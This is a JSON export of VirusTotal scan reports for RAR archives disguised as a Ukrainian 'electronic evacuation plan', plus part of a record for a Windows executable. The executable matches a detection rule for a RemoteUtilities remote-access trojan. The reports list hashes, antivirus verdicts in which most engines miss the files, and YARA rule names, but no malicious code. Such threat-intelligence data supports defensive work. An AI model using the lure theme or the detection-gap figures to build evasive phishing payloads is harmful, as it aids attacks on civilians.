          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5041",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50867",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.138.50867",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.627",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28638",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240126-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36381",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37241B:27.34708",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1706331626",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-27.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Agent.CBCA!tr.bdr",
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "trid": [
        {
          "file_type": "RAR compressed archive (v5.0)",
          "probability": 61.5
        },
        {
          "file_type": "RAR compressed archive (gen)",
          "probability": 38.4
        }
      ],
      "sha256": "68d5c1ce76e3461de065e61ade5428ab10eb1962aa9f2e89199823a033d5cbca",
      "tags": [
        "rar"
      ],
      "last_analysis_date": 1706332484,
      "unique_sources": 4,
      "first_submission_date": 1705911154,
      "ssdeep": "393216:AeCGCzC0tMX/epXmFA8/pxLJjry8RtfK8rejIw7b4zBnKp89MChVGeQO:CZ9mb/vLJPtw8kdenwIMGVrX",
      "md5": "958069ef4f14cd583df15964eaaa23b8",
      "sha1": "f6c3e1c4aec1c0a6009b2f073ae26b3f8ef706da",
      "magic": "RAR archive data, v5",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 15,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 1,
        "undetected": 59
      },
      "meaningful_name": "Електронний план евакуації.rar",
      "reputation": 0
    },
    "type": "file",
    "id": "68d5c1ce76e3461de065e61ade5428ab10eb1962aa9f2e89199823a033d5cbca",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/68d5c1ce76e3461de065e61ade5428ab10eb1962aa9f2e89199823a033d5cbca"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f730247565d4a4ddef22"
  },
  "data": {
    "attributes": {
      "type_description": "RAR",
      "tlsh": "T1DC273396111AF7848B3F186412E446E3E94ED332A56281F4E7D93BE1B136C7D3B1A738",
      "type_tags": [
        "compressed",
        "rar"
      ],
      "names": [
        "Електронний план евакуації.rar"
      ],
      "last_modification_date": 1706335717,
      "type_tag": "rar",
      "times_submitted": 12,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 20790408,
      "type_extension": "rar",
      "last_submission_date": 1706335717,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50865",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.138.50864",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.627",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28635",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-26.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240126-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36380",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37240B:27.34704",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1706292025",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Agent.CBCA!tr.bdr",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "trid": [
        {
          "file_type": "RAR compressed archive (v5.0)",
          "probability": 61.5
        },
        {
          "file_type": "RAR compressed archive (gen)",
          "probability": 38.4
        }
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        }
      },
      "sha256": "f4015611de5e82e3f81a77b896af259d120f1ca956035378a3d9e51fba010669",
      "tags": [
        "rar"
      ],
      "last_analysis_date": 1706294738,
      "unique_sources": 8,
      "first_submission_date": 1705909291,
      "ssdeep": "393216:8eCGCzC0tMX/epXmFA8/pxLJjry8RtfK8rejIw7b4zBnKp89MChVGeQ/:WZ9mb/vLJPtw8kdenwIMGVrq",
      "md5": "3fe53d6864dab01448b5cf85f7a2e94d",
      "sha1": "06e23d54e03a5af408a237b2e6da47458c0d9ee1",
      "magic": "RAR archive data, v5",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 14,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 1,
        "undetected": 60
      },
      "meaningful_name": "Електронний план евакуації.rar",
      "reputation": -1
    },
    "type": "file",
    "id": "f4015611de5e82e3f81a77b896af259d120f1ca956035378a3d9e51fba010669",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/f4015611de5e82e3f81a77b896af259d120f1ca956035378a3d9e51fba010669"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f764247565d4a4ddef2c"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T158273316F2A50AA9D069DD34A4428D57E3B97C8D7370BF8B2DA0710B2DC7360AF36716",
      "vhash": "027086655d155d1515155az939z3tz",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "rule_name": "MALWARE_Win_RemoteUtilitiesRAT",
          "description": "RemoteUtilitiesRAT RAT payload",
          "author": "ditekSHen",
          "ruleset_id": "00cc803bdc",
          "ruleset_name": "malware",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        },
        {
          "rule_name": "Windows_API_Function",
